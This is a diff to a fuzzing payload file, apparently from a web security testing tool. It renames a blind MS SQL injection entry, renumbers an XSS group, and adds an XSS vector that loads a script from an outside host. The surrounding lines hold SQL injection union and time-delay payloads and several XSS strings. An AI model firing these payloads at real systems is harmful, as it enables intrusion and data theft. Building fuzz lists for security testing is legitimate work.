@@ -204,7 +204,7 @@ A
 ' union (select NULL, NULL, NULL, NULL,  (select @@version)) --
 ' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --
 
-P:SQL-MS2-BLN:MS SQL Injection (Blind):9
+P:SQL-MS2-BLN:MS SQL Ninja Injection (Blind):9
 > SQL Injection | Injection | Replacive Fuzzers
 a
 '; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --
@@ -265,7 +265,7 @@ P:XSS-101:XSS 101:9
 >"'
 
 
-P:XSS-102:XSS 102:9
+P:XSS-102:XSS 102:10
 > XSS | Replacive Fuzzers
 '';!--"<XSS>=&{()}
 */a=eval;b=alert;a(b(/e/.source));/*
@@ -276,7 +276,7 @@ P:XSS-102:XSS 102:9
 <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
 <BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>
 perl -e 'print "<SCR\0IPT>alert("XSS")</SCR\0IPT>";' > out
-
+<DIV STYLE="background-image: url(http://ha.ckers.org/xss.js)">Div Body</DIV> 
 
 P:XSS-JSC-BRK:XSS JS Breaks:11
 > XSS | Replacive Fuzzers
